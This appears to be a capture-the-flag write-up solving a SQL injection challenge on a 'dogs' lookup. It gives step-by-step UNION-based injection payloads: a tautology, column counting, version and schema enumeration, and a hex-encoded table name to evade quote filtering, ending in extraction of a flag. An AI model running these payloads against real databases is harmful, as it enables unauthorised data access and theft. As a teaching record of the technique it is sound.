```sql
1 OR 1=1
```

lists all the entries of the dogs table, not really helpful

To determine number of columns in the result set:

```sql
1 ORDER BY 1
1 ORDER BY 2
1 ORDER BY 3
1 ORDER BY 4
1 ORDER BY 5
```

At 5, it gives no results; so there are **4 columns**

Querying for version:

```sql
1 UNION SELECT NULL, @@version, NULL, NULL
```

The result is `5.5.58-0ubuntu0.14.04.1`, which is a MySQL version

Querying for table names:

```sql
1 UNION SELECT NULL, table_name, NULL, NULL FROM information_schema.tables
```

A promising table name: `w0w_y0u_f0und_m3`

Quering for its columns:

```sql
1 UNION SELECT NULL, column_name, NULL, NULL FROM information_schema.columns WHERE table_name='w0w_y0u_f0und_m3'
```

But this gives no results, maybe because quotes are disallowed. So, using hex:

```sql
1 UNION SELECT NULL, column_name, NULL, NULL FROM information_schema.columns WHERE table_name=0x7730775F7930755F6630756E645F6D33
```

A promising column name: `f0und_m3`

Querying for the rows:

```sql
1 UNION SELECT NULL, f0und_m3, NULL, NULL FROM w0w_y0u_f0und_m3
```

Voila!
